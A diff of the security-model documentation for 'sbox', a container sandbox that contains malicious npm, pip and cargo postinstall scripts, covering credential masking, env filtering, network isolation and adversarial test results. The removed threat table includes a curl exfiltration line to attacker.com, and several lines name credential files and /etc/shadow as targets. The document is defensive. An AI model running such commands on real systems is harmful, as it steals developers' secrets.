@@ -1,76 +1,93 @@
 # Security Model
 
-## Threat model
+## What sbox is defending against
 
-sbox is designed to contain **malicious postinstall scripts** — code that runs automatically during `npm install`, `pip install`, `cargo build`, or similar package-manager invocations.
+The threat is **malicious postinstall scripts**. When you run `npm install`, every package you install can declare a `postinstall` script that runs automatically on your machine with your user's full privileges. The same is true for `pip install` (setup.py), `cargo build` (build.rs), and similar.
 
-Common attack patterns from real-world supply chain incidents:
+Most of the time these scripts do legitimate things: compile native modules, download platform-specific binaries, set up configuration. Sometimes they do not. The March 2026 Axios supply chain attack delivered a remote-access trojan via a postinstall hook. The script ran on developer machines and CI servers, read credentials from the environment and filesystem, and exfiltrated them.
 
-| Attack | Example |
-|--------|---------|
-| Credential read | Read `~/.ssh/id_rsa`, `~/.aws/credentials`, `.npmrc` |
-| Environment leak | Dump `process.env` containing `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY` |
-| Network exfiltration | `curl https://attacker.com/?data=$(env \| base64)` |
-| Workspace write | Modify `.git/hooks/pre-commit` to persist across future runs |
-| Privilege escalation | Attempt `sudo`, check for root, read `/etc/shadow` |
+sbox's answer: run those scripts inside a container that cannot see your credentials, cannot reach the internet (or can only reach the registry), and cannot write outside a controlled area. If the script is malicious, it runs in a box with nothing worth stealing.
 
-## What sbox blocks
+---
 
-### Credential reads
+## What happens during a sandboxed install
 
-Files listed in `workspace.exclude_paths` are masked with `/dev/null` bind mounts. The postinstall script sees an empty file instead of the real content.
+When you run `sbox run -- npm install`:
+
+1. sbox reads `sbox.yaml`, resolves the policy, and builds a container command
+2. A rootless Podman container starts with:
+   - Your project directory bind-mounted read-only at `/workspace`
+   - `node_modules/` bind-mounted read-write at `/workspace/node_modules/`
+   - No other filesystem access
+   - Only the env vars you explicitly allowed
+   - No network (or only allowed registry IPs)
+3. npm runs inside the container, downloads packages, runs postinstall scripts
+4. The container exits
+5. `node_modules/` on your host contains the installed packages
+
+The postinstall scripts ran in step 3. They saw an empty home directory with no SSH keys, no AWS credentials, no `.npmrc` token. They could not reach `evil.attacker.com`. They could not write outside `node_modules/`. They could not escalate privileges.
+
+---
+
+## What each control does
+
+### Credential masking
+
+Files listed in `exclude_paths` are replaced with empty `/dev/null` bind mounts inside the container. The postinstall script sees a zero-byte file instead of the real content.
 
 ```yaml
 workspace:
   exclude_paths:
-    - .npmrc
-    - .netrc
-    - ".ssh/*"
-    - ".aws/*"
-    - ".docker/*"
-    - ".kube/*"
-    - "*.pem"
-    - "*.key"
+    - .npmrc          # masks ./npmrc in the workspace
+    - ".ssh/*"        # masks all files inside .ssh/
+    - ".aws/*"        # masks all files inside .aws/
 ```
 
-The home directory is not mounted. A postinstall script reading `~/.ssh/id_rsa` inside the container hits the container's own home directory, which contains no host credentials.
+The home directory is never mounted. A postinstall script that tries `fs.readFileSync(os.homedir() + '/.ssh/id_rsa')` hits the container's own home directory, which has nothing in it — not your key.
 
-### Environment variable leaks
+Files in the workspace that match `exclude_paths` are masked. For example, if your project has a `.env` file with API keys, it appears empty inside the container.
 
-Only explicitly configured environment variables reach the container. Everything else is stripped.
+### Environment filtering
+
+Every environment variable on your host is stripped before the container starts. Only variables you explicitly list in `pass_through` are forwarded. Variables in `deny` are blocked even if they appear in `pass_through` or `set`.
 
 ```yaml
 environment:
   pass_through:
-    - TERM        # explicitly allowed through
+    - TERM
+    - CI
   deny:
     - NPM_TOKEN
-    - NODE_AUTH_TOKEN
     - AWS_SECRET_ACCESS_KEY
-    - AWS_ACCESS_KEY_ID
     - GITHUB_TOKEN
 ```
 
-`deny` takes precedence over `pass_through` and over `set`. A variable in both `set` and `deny` is not passed to the container.
+A postinstall script that reads `process.env.NPM_TOKEN` gets `undefined`. The variable was never in the container's environment.
 
-### Network exfiltration
+`deny` always wins. If a variable is in both `set` and `deny`, it is not passed to the container.
 
-With `network: off`, the container has no network stack at all — DNS, TCP, and UDP all fail immediately. With `network_allow`, only whitelisted registries are reachable. See [network.md](network.md) for details.
+### Network isolation
 
-### Workspace writes
+With `network: off`, the container has no network interface. DNS fails. TCP connections fail immediately. There is nothing to reach.
 
-The workspace is mounted read-only by default. Only paths listed in `writable_paths` are writable.
+With `network_allow`, the container's DNS is pointed at a non-routable address so arbitrary lookups fail, while specific registry IPs are injected directly into `/etc/hosts`. The container can reach the registry but not arbitrary internet hosts.
+
+See [network.md](network.md) for the full explanation of how this works and where the gaps are.
+
+### Read-only workspace
+
+The workspace is mounted read-only by default. A postinstall script cannot modify your source files, your git history, your CI config, or your shell profile. Path traversal attempts (`../../etc/crontab`) fail with `EACCES`.
+
+Only `writable_paths` are writable:
 
 ```yaml
 workspace:
   writable: false
   writable_paths:
-    - node_modules   # only the output directory is writable
+    - node_modules    # output directory
 ```
 
-Path traversal attempts (`../../../etc/crontab`) land outside the container's writable area and fail with `EACCES` or `EROFS`.
-
-### Privilege escalation
+### No new privileges
 
 ```yaml
 profiles:
@@ -78,78 +95,74 @@ profiles:
     no_new_privileges: true
 ```
 
-`no_new_privileges` prevents the container process from gaining additional privileges via `setuid` binaries or capabilities. Combined with rootless Podman (UID mapping), the container user is never root on the host even if it is root inside the container.
+This sets `--security-opt no-new-privileges` on the container. The process inside cannot gain additional Linux capabilities via setuid binaries. Combined with rootless Podman, the container process is your UID on the host — never root.
 
-## What sbox does NOT block
+---
 
-### Post-install artifacts on the host
+## What sbox does NOT protect against
 
-sbox isolates the install step. Once the sandbox exits, installed artifacts (`node_modules`, `.venv`, built binaries) live on the host filesystem. Running `node`, `npx`, `python -m`, or any script from `node_modules/.bin` outside sbox executes that code with full host privileges.
+### Post-install artifacts running on the host
 
-**Mitigation:** route all execution through sbox using a `default` profile:
+After `sbox run -- npm install` exits, `node_modules/` is on your host. If you then run `npm run build` on the host (outside sbox), node executes code from `node_modules/` with your full host privileges.
 
-```bash
-sbox run -- npm start
-sbox run -- node server.js
-```
+A malicious package can plant code in `node_modules/.bin/` during install. That code does nothing during the sandboxed install. It executes when you run your build script outside the sandbox.
 
-Or redirect package output into cache volumes so nothing lands in the workspace at all (see the `npm_config_prefix` pattern in the README).
+**The fix:** route build and run commands through sbox too. See [Progressive adoption](adoption.md), Stage 3.
 
-### Raw IP connections when using `network_allow`
+### Hardcoded IP addresses with `network_allow`
 
-`network_allow` enforces by DNS — it blocks hostname lookups and injects allowed IPs into `/etc/hosts`. A postinstall script that hardcodes a known IP bypasses this. `network: off` is the only complete network block.
+`network_allow` enforces by DNS. It cannot stop a postinstall script that skips DNS and connects directly to a hardcoded IP. Cloud metadata endpoints (`169.254.169.254`) are reachable this way.
 
-### Timing and side-channel attacks
+**The fix:** use `network: off` with a pre-populated cache, or the two-phase install pattern. See [network.md](network.md).
 
-sbox does not prevent a malicious package from consuming CPU, memory, or disk within the container's resource limits. It does not enforce resource quotas by default.
+### Resource exhaustion
 
-### Supply chain attacks on the image itself
+sbox does not limit CPU or memory by default. A malicious package can spin up threads and consume resources inside the container. This affects performance but not host security.
 
-If the container image is compromised, all bets are off. Use `image.digest` to pin to a known-good image and `verify_signature: true` with a real signing policy to detect tampering.
+### Container escape
 
-## Adversarial test suite
+sbox relies on Linux namespaces for isolation. A kernel vulnerability that allows container escape would bypass all sbox controls. Rootless Podman reduces the attack surface (no root daemon, no setuid binaries in the container runtime path), but is not a guarantee.
 
-The `tests/adversarial/` directory contains a test harness that installs a real malicious npm package and verifies that every common postinstall attack pattern is blocked.
+---
 
-```bash
-./tests/adversarial/run.sh
-```
+## Adversarial test results
 
-Results from a passing run:
+The `tests/adversarial/` directory contains a test harness that runs a real malicious npm package inside a sandbox and verifies each attack pattern was blocked.
 
 ```
-── Credential reads (expect: BLOCKED) ──────────────────────────────
-  ✓ PASS  read ~/.ssh/id_ed25519                        [BLOCKED]
-  ✓ PASS  read ~/.ssh/id_rsa                            [BLOCKED]
-  ✓ PASS  read ~/.npmrc                                 [BLOCKED]
-  ✓ PASS  read ~/.netrc                                 [BLOCKED]
-  ✓ PASS  read ~/.aws/credentials                       [BLOCKED]
-  ✓ PASS  read ~/.docker/config.json                    [BLOCKED]
-  ✓ PASS  read ~/.kube/config                           [BLOCKED]
+── Credential reads ─────────────────────────────────────────────────
+  ✓ PASS  read ~/.ssh/id_ed25519      [BLOCKED]
+  ✓ PASS  read ~/.ssh/id_rsa         [BLOCKED]
+  ✓ PASS  read ~/.npmrc               [BLOCKED]
+  ✓ PASS  read ~/.netrc               [BLOCKED]
+  ✓ PASS  read ~/.aws/credentials     [BLOCKED]
+  ✓ PASS  read ~/.docker/config.json  [BLOCKED]
+  ✓ PASS  read ~/.kube/config         [BLOCKED]
 
-── Environment leaks (expect: BLOCKED) ─────────────────────────────
-  ✓ PASS  dump sensitive env vars                       [BLOCKED]
+── Environment leaks ────────────────────────────────────────────────
+  ✓ PASS  dump sensitive env vars     [BLOCKED]
 
-── Network exfiltration (expect: BLOCKED) ──────────────────────────
-  ✓ PASS  HTTP exfil to attacker server                 [BLOCKED]
-  ✓ PASS  raw TCP socket to 1.1.1.1:443                 [BLOCKED]
-  ✓ PASS  curl to external URL                          [BLOCKED]
-  ✓ PASS  wget to external URL                          [BLOCKED]
+── Network exfiltration ─────────────────────────────────────────────
+  ✓ PASS  HTTP exfil to attacker      [BLOCKED]
+  ✓ PASS  raw TCP to 1.1.1.1:443      [BLOCKED]
+  ✓ PASS  curl to external URL        [BLOCKED]
+  ✓ PASS  wget to external URL        [BLOCKED]
 
-── Workspace writes (expect: BLOCKED) ──────────────────────────────
-  ✓ PASS  write to workspace root (../../../)           [BLOCKED]
-  ✓ PASS  write to .git/hooks/pre-commit                [BLOCKED]
+── Workspace writes ──────────────────────────────────────────────────
+  ✓ PASS  write via path traversal    [BLOCKED]
+  ✓ PASS  write .git/hooks/pre-commit [BLOCKED]
 
-── Privilege escalation (expect: BLOCKED) ──────────────────────────
-  ✓ PASS  sudo id                                       [BLOCKED]
-  ✓ PASS  check if running as root                      [BLOCKED]
-  ✓ PASS  read /etc/shadow                              [BLOCKED]
+── Privilege escalation ─────────────────────────────────────────────
+  ✓ PASS  sudo id                     [BLOCKED]
+  ✓ PASS  check if running as root    [BLOCKED]
+  ✓ PASS  read /etc/shadow            [BLOCKED]
 
 Results: 17 passed, 0 failed, 0 skipped
-All checks passed — sandbox held.
 ```
 
-Run this on a VM or disposable machine — if a containment check fails, the host may be compromised.
+See [adversarial-testing.md](adversarial-testing.md) for how to run this yourself.
+
+---
 
 ## Strict mode
 
@@ -164,10 +177,10 @@ runtime:
   strict_security: true
 ```
 
-Strict mode refuses execution if:
+Strict mode adds hard requirements on top of the normal policy:
 
-- sensitive host variables are being passed through to the container
-- an install-style command runs without a lockfile present
-- the image is not pinned to a digest
+- **Image must be pinned.** If `image.digest` is not set, execution is refused. This prevents silent image drift — you know exactly which image you reviewed.
+- **Lockfile must exist** for install-style commands. `npm install` without a `package-lock.json` installs latest versions, which may have changed since you last audited. Strict mode refuses until the lockfile is present.
+- **No sensitive pass-through.** If any variable in `pass_through` looks like a credential (contains "token", "secret", "key", "password", "credential"), strict mode refuses.
 
-Use strict mode in CI pipelines where you want hard guarantees, not just best-effort defaults.
+Use strict mode in CI where you want hard guarantees, not just best-effort defaults.
